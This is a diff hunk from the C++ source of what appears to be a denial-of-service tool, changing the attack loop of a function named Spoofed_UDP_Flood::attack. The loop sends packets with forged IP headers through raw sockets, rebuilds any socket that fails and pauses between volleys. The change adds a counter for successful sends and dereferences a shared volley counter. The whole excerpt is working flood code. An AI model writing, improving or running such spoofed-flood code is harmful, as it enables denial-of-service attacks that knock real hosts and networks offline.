@@ -71,10 +71,12 @@ void Spoofed_UDP_Flood::attack() {
             if((static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)))) == -1) {
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_UDP);
+            }else{
+                (*conf->req)++;
             }
             delete pseudogram;
         }
-        conf->voly++;
+        (*conf->voly)++;
         pause();
     }
 }
